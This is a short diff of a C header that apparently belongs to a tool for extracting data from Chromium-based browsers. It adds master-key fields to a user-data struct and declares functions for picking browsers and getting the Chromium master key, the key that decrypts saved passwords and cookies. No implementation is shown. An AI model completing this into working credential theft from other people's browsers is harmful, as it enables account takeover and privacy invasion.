@@ -38,6 +38,8 @@ typedef struct _USER_DATA {
 	LPWSTR lpUserDataPath;
 	LPWSTR lpBrowserName;
 	LPWSTR lpKeyPath;
+	PBYTE pMasterKey;
+	DWORD cbMasterKey;
 	PPROFILE_INFO* ProfileList;
 	DWORD cProfile;
 } USER_DATA, *PUSER_DATA;
@@ -48,6 +50,16 @@ PUSER_DATA* PickChromium
 );
 
 VOID FreeUserData
+(
+	_In_ PUSER_DATA pUserData
+);
+
+PUSER_DATA* PickBrowsers
+(
+	_Out_ PDWORD pdwNumberOfUserDatas
+);
+
+BOOL GetChromiumMasterKey
 (
 	_In_ PUSER_DATA pUserData
 );
